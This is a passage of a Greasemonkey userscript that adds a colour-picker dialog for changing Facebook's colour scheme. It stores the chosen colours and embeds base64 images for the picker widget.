// ==UserScript==
// @name           facebook colour changer by RN Hckr
// @namespace      znerp
// @description    Gives the option of changing the facebook colour scheme!
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        *
// ==/UserScript==

var logo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAIAAAB1UkQCAAAABnRSTlMAAAAAAABupgeRAAAG0klEQ"+
           "VR4nO1Ya0wUVxQ%2Bs7O7s7AsLC9REAXfr%2FqIIjG20mprTaimWLESaW1tbNWgrdY0aQhVYm2axtQXQdJWo4iKVkOt2BhRfAAK"+
           "LApWEQRXHsLusizsm33Mzk5%2F3GVY2NlxScVf%2B%2F26c%2B53zzn3zLn3nBkAP%2Fzwww8%2F%2FMBeyth39OasKVEhQQQAa"+
           "I3WlHdnjrxXAACffnc%2BWCLKyVo10oZWbsmPDBNLg0S%2Ffp%2F8ajReLWsiSYruh95ofTV6OXHx2uP79Z0dKn1nl36kbV251f"+
           "joqUrdY3r0VPVqNBb8XUsPRq%2B%2B79Wo5kSPrg%2BZM5hG%2FCUxW2tu0%2Fi%2Bis8xlzgnlhnrDNZefZ9G9zqiRpIUGlAUP"+
           "dK27CQlFOAAQDuHYYvHMRdACNDA6XTuPnJ94rjwxNmxHHw%2FAADalTqUvfb%2Bl%2F96oOo2IrtavWWkbdnsDmSrqaXb91XsJ3"+
           "T%2F8bKJ48LCQ0ToEedBSUWzyWLXG6yfrZ5%2F5nJdQIArDR0Op0pjqm%2Fuysv%2B0F3DxsyLSxMnxMWEigOEdpLq0ZnlL7SVd"+
           "e2n938MAOt3nXt7YfzU%2BEiJmLCTlKLbUCZr9SxhOI7l%2F%2FVgfLRUIiZIytmpMlyraHY3tDX70pL5cbHRUkKIW6yONoW2tO"+
           "r58X0fuSvxheOOtJ2Fe7Ytw3k8ALDZHTMnR%2FkYSqh53EGzobNL%2F2VWEUVRQ%2BSkgyqtlDPLj12o6bPYPZcfKbgHAD%2F%2"+
           "FdltvtA6Zcjqd%2F9x5ipYzueYJi5XMzrmBaEUl9e71nSEcu1DDePJSjmeu3a5%2BzjCv3Gr0NWQAIHvEHrWHjcrsnBvetnT41F"+
           "0A4CAcPFmRtrOQNaAMgTtqNE23dPQCwIET5RycAyfKfeQMiVrmwWtOpxNJOrv0KRkFrPFhP6F1DQob6Zg%2FI0ZE8AGApun79Qo"+
           "b6ah9otQbrRW1bYgmwPHxMdKo8CD0iGpuWvJs9EjTUNugeNaqAYDw0MDoUSE9ur6khPgAket035G1XLrREB8btil1ASHkA8DKd6"+
           "Z9A0AD3a%2BBbpB3P5GroyKCFs8bx%2BPxAGB0hAQAkpOmunmrbG7rmTtt9OS4CCRJTpq6wzcOA1RCN69LxDAMOZ9XWF2Uk%2B4"+
           "9tbyAqQak92qwftc5q41EtAa5GgAMJtfpa1PoPPmllXLmbW%2FNvoSE8vYeJNEZLACgUBvQo9YwUA0Yjs3uAIBevaunU6gNiJCS"+
           "UcAIUV%2FpC4fJtYeNymMXahjf7shaOCLD1a%2FxMPbvrdTtp6dMiJQEEgBgsZEURbn0YAAAAj6OaAa2DwmcN6BzT8ayH7YaASA"+
           "0JMDlDT64E3JroUx9dlbfTGYbGhTlpB%2FK1IUGBzCzvnAYjImUpK6YhcZag%2BWPP2Wse3f5yTHHit%2FPV695%2Fw1psMgbga"+
           "Zde8W4ekEAgMgw8RCJQIAPUuUWtiGbZCYwt9eA9XNonzmszsgedeb%2FspbD8%2BFFbfeR61%2BsSfCSgh5uOV%2Bi7ckztcVGY"+
           "m7qzJZBCYW5%2FVxw0uy9u3tPT%2F8PjkpjJIR8lIaL543bmHmRozsZXtQS58Qyeyy9J79b1y7g49s%2FWYQueLRJinJFi7n13U"+
           "E6Bq7Io4VVrL80WG%2BGoEAhGri23b93ghiwIhL2b2dwsnFx%2BtGlMVXWvfhq3UIAEAcKN61JOL7P0wsXhhc1IX%2Fg1NU2KrO"+
           "2Lt3%2B42UmWdA50GjN4kAhAIyPkV4ta2pq1QBAhDRw7JiQKzcbHzerly2ahPg7NiyeM7XabCFxnBcaLBodEdTwXLMtfdGAOQF2"+
           "4ES5zU7NnT4mLkaKhH1WEgC0Bgu6JWJHB5dUNDe2aBbMimFOGSojvnAYiAjB5rTE5Hf0Y6OCASBxTmzWoZK9X783rPgAAHSo9EN"+
           "qaN7ZKqbK2OwOlcZIOgZ6SBSgw6fuemuRDuVXpG4%2FzRRZT6CukrtfQ82we73zBGpifeEM6df25pYyhDaFdtWW%2FGFHTaUZ8B"+
           "5JUjIKmFAyYNrCNoUW0a6WNbE6mnumEgCyc254CxyKGvOnyBNPW7rX7jgLAB9sPln%2BoJVDiY8cRoKaZxj8XVRY%2FJA1Mlwnt"+
           "L6pSy7qBberqignPVB0bvXymTMmjcIxTK01y%2F7toJx0UkI8ALxQun4irnhrStahkiUL4mKiQkQE3%2BGgtEZrh0pf16AEgN0Z"+
           "y%2BTt55e%2FOXn6xFFSiYjHw%2BwkZTTbujQm1CUdv1AzfWJkZFiQREwQQhwALDZS02uuqVfcqn5enLcBAIrzNhTnwd7c0oWzY"+
           "6MjJQTBt1jJTrWhXNby07crkBu%2BcMpqWnGcBwDqXhOS5J6t%2BjxlPo%2BHAUCw91bBDz%2F88MMPP%2Fzw4zXhP4xva6the9"+
           "vrAAAAAElFTkSuQmCC";     

function submit() {
  node = document.getElementById("znerp");
  setup = {colour1:node.getElementsByTagName("input")[0].value,
           colour2:node.getElementsByTagName("input")[1].value};
  GM_setValue("setup", uneval(setup));
  window.clearInterval(inter);
  node.parentNode.removeChild(node);
}

function cancel() {
  node = document.getElementById("znerp");
  addStyle(eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})')));
  window.clearInterval(inter);
  node.parentNode.removeChild(node);
}

function setColours() {

  var setup = eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})'));
  if (!setup.colour1 && !setup.colour2)
      setup = eval('({colour1:"#3b5998", colour2:"#6d84b4"})');

  newDiv = document.createElement("div");
  newDiv.setAttribute("id", "znerp");
  newDiv.setAttribute("style", "position: fixed; left: "+((window.innerWidth / 2) - 290)+"px; top: "+((window.innerHeight / 2) - 200)+"px; z-index: 1337; background: #fff; border: 2px solid #000; padding: 3px; width: 577px");
  newDiv.innerHTML += "<center><b><h2>Facebook Colour Changer by RNHCKR.com<h2></b></center>";
  
  table = document.createElement("table");
  
  row0 = document.createElement("tr");
  column01 = document.createElement("td");
  column02 = document.createElement("td");
  column01.innerHTML = "<center>Colour 1</center>";
  column02.innerHTML = "<center>Colour 2</center>";
  row0.appendChild(column01);
  row0.appendChild(column02);
  table.appendChild(row0);
  
  colour1 = document.createElement("input");
  colour1.setAttribute("type", "text");
  colour1.setAttribute("class", "color");
  colour1.setAttribute("value", setup.colour1);
  
  colour2 = document.createElement("input");
  colour2.setAttribute("type", "text");
  colour2.setAttribute("class", "color");
  colour2.setAttribute("value", setup.colour2);
    
  colour1Div = document.createElement("div");
  colour1Div.setAttribute("id", "colour1");
  colour1Div.appendChild(colour1);
  column11 = document.createElement("td");
  column11.appendChild(colour1Div);
    
  colour2Div = document.createElement("div");
  colour2Div.setAttribute("id", "colour2");
  colour2Div.appendChild(colour2);
  column12 = document.createElement("td");
  column12.appendChild(colour2Div);
  
  row1 = document.createElement("tr");
  row1.appendChild(column11);
  row1.appendChild(column12);
  table.appendChild(row1);
  
  newDiv.appendChild(table);
  
  buttonInput = document.createElement("form");
  button1 = document.createElement("input");
  button1.setAttribute("type", "button");
  button1.setAttribute("value", "Cancel");
  button1.addEventListener("click", cancel, false);
  
  button2 = document.createElement("input");
  button2.setAttribute("type", "button");
  button2.setAttribute("value", "Set!");
  button2.addEventListener("click", submit, false);
  
  buttonInput.appendChild(button2);
  buttonInput.appendChild(button1);
  
  anotherDiv = document.createElement("div");
  anotherDiv.setAttribute("style", "float: right");
  anotherDiv.appendChild(buttonInput);
  newDiv.appendChild(anotherDiv);
  
  document.body.appendChild(newDiv);
  
  style = document.getElementsByTagName('head')[0].appendChild(document.createElement('style'));
  style.type = 'text/css';
  oldColour1 = '';
  oldColour2 = '';
  inter = window.setInterval(function (){
    var colour1 = document.getElementById("znerp").getElementsByTagName("input")[0].value;
    var colour2 = document.getElementById("znerp").getElementsByTagName("input")[1].value;
    if(oldColour1 != colour1 || oldColour2 != colour2)
      addStyle({colour1:colour1, colour2:colour2});
    oldColour1 = colour1;
    oldColour2 = colour2;
  },1000);
  
  /** The following code is taken and slightly modified from code by Bob Ippolito <bob@redivi.com>.
   ** See somewhere in the middle of this code for the original and unmodified copyright notice.
   **/
  var CROSSHAIRS_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAVAgMAAADUeU0FAAAACVBMVEUAAPD%2F%2F%2F8AAAAXuLmo"+
     "AAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfWAxYAMBoYReiIAAAAHXRFWHRD"+
     "b21tZW50AENyZWF0ZWQgd2l0aCBUaGUgR0lNUO9kJW4AAAAhSURBVAiZY2RgULvFwMBILrWK4Q8LwzXGUBD1GsajzEwAP%2FoZVv"+
     "c4N8oAAAAASUVORK5CYII%3D";
  var HUE_SLIDER_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAADICAIAAADtOM9PAAAABmJLR0QA%2FwD%2FAP%2BgvaeTAAAA"+
     "CXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1gMXAjE1EbdXmwAAAQlJREFUeNrtmlEOgkAMRBupy%2BL97wqsgnICPtSM7uR5gZ"+
     "fHTBtKzGeIfhmjjFQNnSZywsmeRPdwYp7ICaf%2B3yMcnx7dw%2BlH87SlirQXFWmRXZ9r%2BDk5klYaAYkdgdMJaWYb0T2cmNwT"+
     "UqN7dM8%2Bpy2uqptQRgrV8X6QqqHTRE40gu7RCPYeOeFk1r3CPNE95qk%2Fp12Wk%2Br8zGgy0gKpi0Y4Os3khBNOzBPdw%2BkP"+
     "Sbp5anSP7rnndLmrSIOMpPo7bGQNP6cpyOl9UiEnnOx3hKPTzdBppHs42e%2Fyyjzx9HiP%2BN5NqPr0kUM8VBe16ng%2FSKuh00"+
     "JOH5BmGanRCLqHEyS6hxPzRE44%2BZJeueFsJ8zY3KsAAAAASUVORK5CYII%3D";
  var HUE_SLIDER_ARROWS_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAALCAQAAABfL%2FyJAAAAAmJLR0QA%2F4ePzL8AAAAJcEhZcw"+
     "AACxMAAAsTAQCanBgAAAAHdElNRQfWAxYPFQ14OfqVAAAAnElEQVQoz63Suw2EMAwGYJ9Ss0BaBkCsAYtki6uRmAM2yRwREh0Sgc"+
     "hURj%2FNne5o7oEsV3bx2bJNI7hBBrocGTcjqEW%2FcRQHc4Ew4jj2Wwu6gVDCpzWg%2BhOp1uBTCcId9KzVCCl6FD8SRfQh1Y%2"+
     "FkjSEYuH3mpYP9Qtilm9ntry2cGALBYhCZkH9AcpkGOXfSn0ZhNyqXUvkbnS8%2BAP2Frl9tNFLoAAAAAElFTkSuQmCC";
  var SAT_VAL_SQUARE_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAQAAAAHUWYVAAAAAnNCSVQICFXsRgQAAAAZdEVYdFNvZn"+
     "R3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAsAUlEQVR42u1823IkOXakA0FWVXdLM6Oe1a5GL2u2L2u2%2F%2F99jE1mBAD3cx"+
     "yISFaP9NI21qQimRcWHH47CKpgx8fjvz19v3%2F186%2F47%2FjM13%2BD%2F5LfsvwJyJ%2BA%2FAnIn4D8CYhe4QqQ8tOfWW6%"+
     "2BoiwAKeYdiv6evHQf9MnnVaGflef39vXze31%2Brx%2F18%2Bv%2B9vi%2B7T8%2B3vZv%2B%2Ff9f3782%2F6f%2B%2F%2F7gw"+
     "C5eH35KYaUe5sAZf0brH8vA1eJcBPs9F0BOWAQQD4hOH6yPa8%2Bgfj83%2FsDim3%2F9eN9%2F%2FH43z8%2Bfn8A8n%2B%2FBM"+
     "jFfi9fkKz0GuBqt17Dfi5RfLTIZ5QJICW9Q6FPKcKJ0r%2B3qwbB8b9PZtQTkMaMbf%2F2AORt%2F%2B3j%2BwOOX%2Fb%2F%2FP"+
     "j7%2Fh%2F7%2F3kBECx070VOlbjkt5d3sd%2BxWHoja0VBC4AUgavIaxSC4zmlA3JcNUAOkXoyAw8YPg5mHIB8itX7%2Fi9PQH59"+
     "APL7%2Fr%2F2%2F30JCL4gQE8WlUuGFA8IPMBl%2FQ4f9Lqp4OTFffwMV47AslQYkJ394fh%2Bfj2BGCJVniJ1cOP98d%2BnWP3y"+
     "EKv3%2FV8%2FfpyA%2FG3%2F9%2F0fC0D2l%2FX8hkEX%2FxmT1xQnQPscJg%2FIECXnAIMh9BWWC0GWDnhOLiACUjsgjRmfgGyP"+
     "r98%2BPgF5wwDklwcg%2F%2Fj46%2F73B0duA1IuTX3FiRIASI861T9lsrg8lSGAdwAnOOO5ZYA29wfkzDTkaYjTU6p2ZkY5odi6"+
     "jdfuHW8PGD4B%2BcvJkP94APL7gyMeENwOixecKDYGFJOyyhyufIVirT4BgmjJLEP0Fc4f2tITBOwWHZDmGiRVOACpZOMHIBsD8v"+
     "GObydDfnkA8pf93x4cKVchtkxTVpnLEi4dIOT72CMKZr9BMe9QvD%2FsElZzU8BgBMuRfDchlowbDQKcSeqEpXeNjbyjAfL9BOQz"+
     "8D4AeYbeXx495F%2F3vz4gyYBgIh8CVtknmo%2Bl6yBLn75TmcpkMZ9dwiYoi8rGvkDpqF2BOTF%2BKsygJDX8oj43TxMpDbinWO"+
     "HwjsM9MiDfnwz5949%2F2f%2By%2F20NSJlkLpt4sLBky6kuZ6tISuJUYuxdQZBC6xCpAhNhB0CYuUXZBxeGSDV4tmDm9QnMIVZv"+
     "T35sT4a8PQD5%2FPr%2BkKxvJyCfDPkfD0A%2BOVKSd0xFxhe4Mk9SXnDgTb2Q05TIHydHH8q4woDsboxxfEYQpQHIrhB0IFAEGE"+
     "pSEnCbZNXeOIZ7tOZxBN7AkEcP%2BY5f9r9%2F%2FLZ%2FQnIPEHgBKzu8AFmGTX1hzgKz%2B4MzjMXGpEVg0qyZFyxW3LSHfWPU"+
     "PWEIhmtk7yhn0D2%2BPuzcAPIshvix%2F%2F4A5Lc5ICVlrhR7UzNugdKmItezoYOLMgD6MBOk3Y4xfGjdba1zJa%2F%2FFzqGDk"+
     "AaBCxVI1dhBN3GjMd31MSQh4egecghWe8EyK%2F7J0dKDrEh8ew3UlIIrZcTUqTq9hEtvwTYg1SlLs2Zqf8McfxX%2BqPBxKl3r1"+
     "0DvWtUsfGazfxp5y3uHg3kwRAwQz6L4ees9wd%2B%2F%2FhlBkhJNr4aUahwmd3%2Fod5hkxPLEpIcOWYguEb%2FvcajnRecnFLJ"+
     "O0082vhe4mQKHRDykBh0t715R2lVEAzIp71%2F3xmQT4Z8ewDyt4%2FPvv7bBSBY73cNumXCKWPXe%2FIKGg6WAJf0B5QkWcW4Rg"+
     "kD8RhlAQWgg8AiBZasYiSrnh5SaUhSUNOw5H0nhnxKFhiQT4Z8fwTeX54jlBUgMPa7MPViISyGPVGGkmvwdKlDWgykRUw9dIw9l7"+
     "yQo0CeQQPzYeqHP4TmIeORBywY7nF6CN46IMc4sXtIM3U8m%2FqDG7%2BdgPx1BkiZBV1oykqZCX5%2Fd8nDfLxtmwNSj1AIiBmj"+
     "d9OiS8AdYpVntcMrCp3tHS18DNFHK9fxSB%2BSNDNvcRfEkM%2Bv6JJ1eMg5XDwA%2BfYA5JhplVT6BJDixaoNrcPpRjE%2BM8Ai"+
     "XwgFsyDNXs1V2Q0wVPNKl1AZgyDMaiXmVkpZ45o4sc%2Bbx%2FbkD02t%2BonHWQhx5Ks2MtlwNPUfrRg%2Bv%2F72rIffHy39GK"+
     "EsASmToUay8dWUyXkHjf9mQjSCwDQzQYaB4GHgUeeIIQLT55U0DcicCqFxQIIu9KzjbOjNQ%2FZKKWvDKVm9hxBDBJBvJyA%2FIi"+
     "A2JWmuQjG920xXY67afXIqPONKpxEYuYiWdXAjXxUHCMp8ZrvL7HbnE7%2B6880JvQQ%2BzbyNScZpYD%2F5AM93W8qKPaQB8usJ"+
     "yDFCmQEyFSDLmmtuYNoi5Lyu7IsExdKFLFLEE5GzC9c4PAMyFgHGnAoyHuH%2B0WNvJQ854y4IkMfVN1MMP039De9nXz8A%2BR4B"+
     "8RCY0zfXIniuBC9nplXsdvQRXhPnVEWANpwwpxiZIRxs0SNtvDmhyHVVyUIEpMfdnY%2BkJGWhnYf8%2BHg%2FAXk3gCD2bQsIxd"+
     "6RsiY%2B8aFi1F5hgy2LFCZzWeULdY0CBE7AiBM3D%2FEMeMmiY9k%2BHqnkGsND6vAQjP5xpKwMyCiGD0Ae8BwMeTZ23AEEbhQe"+
     "rBnBonPD5jqHLEp6nhE4AZuneDKF1LszIIi5qkrvyHmKYAmStVHsbUD0w9p99I9PsTpS1kOyoIBsAsjZ2PGZtiaAGE5g5g%2BWG5"+
     "jYtwGAY68cp3pxigORIFnJLeAGhl2snntfbRydE72H7GOi%2BylZlU5AWhU8vr%2FJULGdhDxNHQOQ7WTIs6%2FvDZBPhnxjQIxI"+
     "wQ474E19UvJkyGLiLaxxA25Ky%2BVvz5I1GMLeUYU3o2lw9QP6nAq5k7NkVYKngsaJ%2FfyjNfVNAXma%2BycUDw%2FBdgLyft7q"+
     "cAASGJKyElzvJsOGHf%2BBu3khCEuGoh%2BgQlJSGg4O1sAZd%2FeHfTIWaYxBlKo2NoxVUCogjGQhjhOPwGtMHdsYv%2Fc7Fh8N"+
     "5WRIA%2BS3JyCOITCtAlaUXMdwxo3UMFjIYAYiu70Jh8Yi6TxDe4hhRkHu4o0Xw8BrP4rKQLRuzpLVGnq7Ge5tH6OTfjSFkyEnIM"+
     "8jXLSDqgbIr5eA7DIONFKTjN%2Fs%2FuAZYXjO7GIWmPE50mHrnscjEnCR5lS7ubGt%2F0wmuUiS9TTuqt08eYiYuktZgyHnucjn"+
     "jdYDkHcPSJauaPEy1IBpGeYAVfgSjJrf19t4irRIN%2BogBVxpHGlatXMRTIdP%2FacDiGbnlaSrYnhIMvUxy9pPhpzF8HkrKQ7J"+
     "%2BgTkGKF83qX1fgKCRWba4%2BldONuO53VI9Q7mfFt5wyIFc5LRuIA0uw2SVYQvAlY849i5i3c7l6DL8NRT0NrpeY%2B958%2Fe"+
     "nhb%2FJieF9cmNp6mj3US64WTI2Ud%2BPPv6eaCLb3cAKaEKFmRYSkpSiS%2BIzynh9eITKxsHi1wxklUHXzAGiMlDxsCkDUsQgi"+
     "6fl2P8qU3zkPMEBAtTP2%2F%2FOXrIEX%2B%2FPx1FATmPq14BpCB1DMuFC054z%2FBdo8sbGXZoFQxTlKxeAXe%2Bd6TnKklV6G"+
     "GW%2BdK4EE5Adh24H7I2TP3zPd732ENq7yGHkzAgxy0PDwfBXLKQjkxnpo7UIiYVMKatYvkxyVMBCEiUHR5SSNa0g3dguGk0a%2B"+
     "9iFcaI1ENYsuoJj8Te08wLhqlvx4khzth7pq1v558jHI29MeR5XJUAQUpJM0CQslPnTX6FDD6gyYmKHRBahTN1GYRgIll96SETXD"+
     "AEYXCoAZd6CMLAHeGMsHnIuDEO%2FL3F3vaXIQaQ%2FROSXz4z15cBUTPnrhEYVnLADaYee3ef2qJM4CkpXUnpa4NDFD%2Bt2osx"+
     "9fZ%2FyfQqSBVLVg09pN2JFc5DMFKWA6T19XbC%2FsaAlPidx4mYhNjJ1xBwEY6XELpFZ4izcQeERForWY09lKuEEyPgXjCkS9U5"+
     "y2qSdY4Ty2njBeohb03CDg85Je1bD7%2FHyeEGvuUhMGQFyAkEwh0ghkUTH4nwjJsSgDQilFGhgDUXKWaCdo10dY4TNeYahohUtT"+
     "5SRxuJsbd%2F5ZTVTP3o7d%2BojbSZVmPIjzUg5moGCIFWbsCjO9xbenxOtu9s6kOqQIbdzwLPYNuHJZAiGE0devJRd7k7cc8e0k"+
     "y930K6aw%2FpsRetjTRAvndA5pJl%2FWHs3ZTHjIcEi0dRw4%2BPBgmLnCBwMCl%2FbkgiztHPBNuA3QqXStYARAbuwUN6D4Hc04"+
     "tw5yIUkDbTOgDZnpIVAZmbt4iLadjzirfLXSHziDvhibuKix8hmEgW4jyX%2Fybw%2FKkwpKqpt1t%2BTqk6Y696CHj8%2FgnB8Z"+
     "0AOYfwvbE%2FAfkE5pCsNw%2FI7OvCI%2BZQuCtt35qriC%2FF%2FIwe1TYOCbqQPyKAzVXUxRGbB%2FGCDm2pofem3m2cTL2dhx"+
     "zfz7%2BgOvsIAXIw5Pib3OYlXwAkghJqHkpylHTFNyVAZrdYcSI%2FWoOpG8nS5hGuKg8XIUdRx9QKEZAaRidvF6Zez5A7CuLR1B"+
     "sw54Hu1wA5FzYtbx%2BEyJRpJlLJtjX28u6HDA4xy1Whk8sA8bRx8B9pgnJUY8%2BCIdJDKsZfSY3RSfOSt2DqDEib%2Bh5fWx%2"+
     "F5to9h%2FBIQuR9kNIbRsAHZ0enKQWBsWzLTghNi6to1gCBSRf%2FuSRjUeFPD6CQwZCpZjSFn7AUB0oaLqAGY1kMyIK0efg7jtx"+
     "kgIlIo0kN6yoK0iysIQCfigUUm6HLKQmJI39NYitTJE%2B4aH%2FQ1pixQN%2B%2FAkJkjAaKxFwkQAqb1kHeqh44h2wmIgkCcaH"+
     "3kYumFN1GybNcIS36LE4MZwESsBqDDJTCOZU3QHT0kMySa%2BVSyQD1EPQQtZdUzZbXwS%2BeHNNn6FK0vAJK4FAGZxtvElA8HR4"+
     "Jgz4NDgOZVoNE6dDgCEamzECKnqilDcEOyvgBIFcl63hN%2F3Bx0B5Bh24Ebkpmyh%2FBz2K5N60CZAJQYA%2FYJXwLRl77fURI4"+
     "gQQAlBPn40vJyh5Cpr5JU3%2Ba%2BlEQQbfN7Xo6chcQ2zr6M%2BGyEy10cosUarG09JS5pPyJkCVTl8pH0ytwqkKQrCo%2FreMs"+
     "HXQ3L7yHFDTvMID0gtgkq81%2B38jcZ4DAZaaZOMkEagKBFELEya0yJApYJb9xA0QEwx5Dki5VMN2cs1aMvSc3%2BrQ3jE7qPoB5"+
     "a7cBURt5SlVIWa2HnPfCdy9pDGnmPgFkzLJk13uwCKYC2zVCIZwxZOYhaUhCECTXSHkqDUeyhyRT30YbwRjDS1PvnGiAHE2d%2Fh"+
     "xhpKzOl36XFtrU96yJp5dkQEAnGBGQmVtgJkv8M3GHDmEBcQhhLBLESQSM09Ww84%2FkGaCBe%2BQGAVC6OJ3wEC8qar%2Bh%2Bi"+
     "lcfbjYZ1mdKScgBzM6IG9P7%2Bi3POzCkFPADCDnneyu4KFPcr2puyTlxiAwDMlJaogUWJxax1BO9OaBMN8FnXUMv6Alh2EID9zJ"+
     "1Luj9Nt%2FwLOswj2ETb3Pss4T9p3%2BSBoKyBl%2FLwEZxc6mLH6UBoWYSpbLVpkhMVedzxXR0gEi8UWZcjID2jwwUlZiSEXoId"+
     "jaiSGN3Qv6n3mi3%2BTQi6HE39M7hCGHl9wBxCSpBIjad1505kv%2Fc0zER0u%2BJv4UAfEOQ8azBheAGHRjypqaOoKZ95R18sX0"+
     "kHO4mGZaz4lW9xJiSOdJT1sekGzxMiqUrLQSKfUDhEWW4WLgRBqPjKmVdA2Tq2Bibx6WNA%2BJnsLdPKYsmNg7esgiZR0wbect2M"+
     "SQY%2Bb7fPVZEAkQ1zx4%2BjRb%2BmjnzsbR77HyjEgQaAVk%2BxZuECCcsmLsHaOTQs8JKUu4II6CLaSs%2FjdT6Och0BPDrZk6"+
     "zXyf%2F5%2FlwmSLGXIXkDiDyiaeuwZmkuUZIdeh4A23IKmCmV4h2bk%2BRonKpCxiSOWmDuJL%2BxOd7iHD2slDQOciJ1Pa1Xs7"+
     "rsJIW9rbIyA5R00Aiabu4aGjKLFx2feJN5KrkBjCIoVs38M1qsReBSLGXLqWHlL3zJTmL02yhqkfTb0QBFvoIScsY%2Fb7PKaquA"+
     "Yk1bzEBWVBXGx7VVK%2BUobU%2FdLG1TUQjmcbBOwgCYqQqoQhNMtClQFKhTZ1OTFEK4abANHco9%2FykAE5haufkkRAlnOqBMhS"+
     "pJJbrAFIrqFjRBkVJm6cwIw8NVwCFohJyiIbj5JV%2B6TLSlbzkHGmTl7SiiGdH2Kcjhw18TwluQcIx965qSs8WgU9M9jUMxR11M"+
     "QERJMnx5B4RbF35CgCrRqAnGQ9T0KQeggBUsbN1sfzJWWN2HsO4%2FvtpUOy6gGI4YSWvixno28jw3QhWTcYksVJJrkIWSsE3JLT"+
     "Fe4xZOMj3A6hk6xRE%2Bs%2B0tax96mPLAB5E4aIZF0AEnZ%2FNHXXuxMXFgwZj9PhU%2BCELr2TrNkVT3uVIXylAKVC2LLXaOo6"+
     "OtEeAhkyQo6rnkCMmkiTrTUg3c7TMpvG0U4%2BUgs3AjZhzCRXSW%2F3DKHmoYN2neuiBKuPpr4JQNLUsZasdh7SYKHRCdrIscfe"+
     "kbkwTL1eApKYYgC54xq5YchrNVUxTASLDg7Tc5xYnTdOn%2FDW8GhiiJWsY6e3VlLJ3Kmpd0DaGJ5N%2FbxxzjJk9JFrQCYscLFX"+
     "4XMQIPiBADOVrHD4tKdCOGUI3c7AwmWaRhOnLFl9uCg8EQ9B4fE795Bxfkix90xgXcA2ir%2FvXcAyIGmHBxAm9j037jAUSWnLMc"+
     "R4yG4aOkwV9DYeHr3NEMpg56MIw8VxhCumXmLK6vAcdh4GKfv5527n9zUgKKmHBECQGHMhWXr%2BcQKH8efJRceKMFMr9pJzqYqw"+
     "gc46UDIHMl8gp%2BgwKWvMsk5OpB5CNTF6ySFcNIwHO8o5%2B3WAyHw3AoJ0oBRM3QtYDdXReAbyIIUaemcTM6SxITOkgZYaOntI"+
     "jr1s6uAxYr8CHVBhpC1n6jT13bmVvFPyenoJ6L5fLoY8idVzitBDjKkX8wpZbANaOGrS8gdt38KTwZ8FIKkQ5tEJokS1Z9W9cg8Z"+
     "R7gY0qWjkyZSzkNKX3ye%2Fb7vMkg5Bey8W%2Bs2IDlPwdykgFmeypI1Y0jRhdfmjUkVNLkKLE7XHjJjCMb3zpAce9ssq1k83sax"+
     "FacsErCtCdgLgHC3mOcpwwkGTSSL05YxdWZBqILQs0FmyPheDAfoSMp5iGdMj7Y0OsEi9vKoEbmxbwGQAdPx5591AQjCbW7sHtHU"+
     "nRxdSpbG3sGQMCyJYtUELJi7BSS4ha2CJmXVyBBJV6EY9u9bl7Pa4VEv6SmLezt49nves6WAlPj9GJ1wMbRcmHIiSpYx9Sr9XeVK"+
     "YRlQriWLTgP7zzIEIKMODOlsqtJKKjOkO0zwEBQCgoGh2S%2BUIX0Y37%2FfBkRZVCaLnvmiklU%2FnIk7Ux8xuO6hmV8yhMbvsb"+
     "FjImB0PSbAG4MjvJl6CIXgw%2BQHENLbh2S9BghF2yksMw9R6BjCAi9ZQ5YiF4Cq8CCN2xND%2Bpn6zENiMWxDxQAFzbLacJE8pN"+
     "K0t1C6ev7svB4jxyxZ51nJCpBQ8zhxudIHD0%2FjAssPXI6CjbjQ8z8CK8%2BxvI1DYu%2FcQ9pwcWeYsplTD5l6SDP1aO7a2zVz"+
     "nSH4ChANvMYtMBMpATJIVkHqIROGRFgiPL15eMlKsdcJWU0MobtOhDE2ZSUP6UN4NfVu7d1RCJCtheAuXWtAwjhEDqBckprnKdtD"+
     "xNQxGSCi39QDsfFbDCGwnIcMvtBPa%2F%2FpSFcnC3o7yR6ykZNEU5di2DPXe2wlERCSqglPrKl7EMagUCSrRokC5aooSyd%2Fxn"+
     "MJgtE5PCA%2B9sbRCZpdR7GqYuYqYdLUR02kITw1doFAJltj9nsa%2FuElXwfEB11o4z73N0kWM%2BYGQ4aHsKmPgXvwibH7Qbvf"+
     "c4LljEeIQ6Q2uWIPaVOsPn7vs9%2FzqjX29kcKaCJVAiDvPYHdBiTnq7qAZ%2BYoSbKYZ8KCEWmzh%2BhzbjPE5Cr1jAbFtmtTP%"+
     "2FZ7bfPddg%2B8THsXpt5nwDzZeustfgNPgh0g1kmWeUoFy8rXYE039Jlkcf4aQxJp6loM5wxRiw8egjw62eTRlLLaPb50tRFrjK"+
     "lDbg7SyZZpJS1trQDRJJVTlkZbdY1RARdMqZYhNHAH32VlYq92jQhIuHIM6VdaDIUvtVv9ELKqvb2bu9zy0KHgzCWz31uAjGGJzq"+
     "sAE1fVA5KHWCCYFZEhNN81HhJiLxBkqYqchWlv8BAzOtFiiDGMV2DOwAw5HcHWrb1%2Fl%2F4%2BmPIm8PQ7468BUQgiF0zXmLoF"+
     "QuWDjENihmrPqgkcSVl8iw8SMOYqw9S%2FJrGi8xDIiSFM7BVTb95Bf6QAuTkIb5YhK0B4MgUztZK9rf4AvV9kJVkMGjMkGbgzdf"+
     "WZnqtmgCQImC8CDYXgSgJWQ%2FaykqWTLQJGQ7Dp7TcACSxwcjSD4EKycqoyDBEPkWJIsdflKiCORaBDxs3yhXkwJGtTASORois%"+
     "2BD0Eydb71AcyQ8jIgOjoZ4hRSFtl4ELDIJRqpw5u6GPfcQ9CvJbReMMT1kC5RKfaOua8WQ5YsGaTQCfvZ20f83VrspQnw4MsrgJ"+
     "gwS48lmAwE3Dnc%2BDAyREfrgyFQMy%2FaQ%2Bg5JRl%2BACQwRH%2B6xUlX6iEiWRgWPxwlMiWGYK6JMla5BkR8QkfrCCUwPZpj"+
